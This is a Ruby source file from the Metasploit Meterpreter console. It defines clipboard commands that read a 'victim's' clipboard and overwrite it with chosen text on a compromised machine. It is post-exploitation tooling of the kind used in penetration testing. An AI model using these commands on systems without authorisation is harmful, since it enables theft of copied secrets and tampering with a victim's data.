# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Extended API window management user interface.
#
###
class Console::CommandDispatcher::Extapi::Clipboard

  Klass = Console::CommandDispatcher::Extapi::Clipboard

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    {
      "clipboard_get_data" => "Read the victim's current clipboard",
      "clipboard_set_text" => "Write text to the victim's clipboard"
    }
  end

  #
  # Name for this dispatcher
  #
  def name
    "Extapi: Clipboard Management"
  end

  #
  # Options for the clipboard_get_data command.
  #
  @@get_data_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ]
  )

  def print_clipboard_get_data_usage()
    print(
      "\nUsage: clipboard_get_data [-h]\n\n" +
      "Attempts to read the data from the victim's clipboard. If the data is in a\n" +
      "supported format, it is read and returned to the user.\n\n")
  end

  #
  # Get the data from the victim's clipboard
  #
  def cmd_clipboard_get_data(*args)
    @@get_data_opts.parse(args) { |opt, idx, val|
      case opt
        when "-h"
          print_clipboard_get_data_usage
          return true
      end
    }

    # currently we only support text values
    value = client.extapi.clipboard.get_data()

    if value.nil?
      print_error( "The current Clipboard data format is not supported." )
    else
      print_line()
      print_line( "Current Clipboard Text" )
      print_line( "-----------------------------------------------------" )
      print_line( value )
      print_line( "-----------------------------------------------------" )
      print_line()
    end
  end

  #
  # Options for the clipboard_set_text command.
  #
  @@set_text_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ]
  )

  def print_clipboard_set_text_usage()
    print(
      "\nUsage: clipboard_set_text [-h] <text>\n\n" +
      "Set the target's clipboard to the given text value.\n\n")
  end

  #
  # Set the clipboard data to the given text.
  #
  def cmd_clipboard_set_text(*args)
    args.unshift "-h" if args.length == 0

    @@set_text_opts.parse(args) { |opt, idx, val|
      case opt
        when "-h"
          print_clipboard_set_text_usage
          return true
      end
    }

    return client.extapi.clipboard.set_text(args.join(" "))
  end

end

end
end
end
end

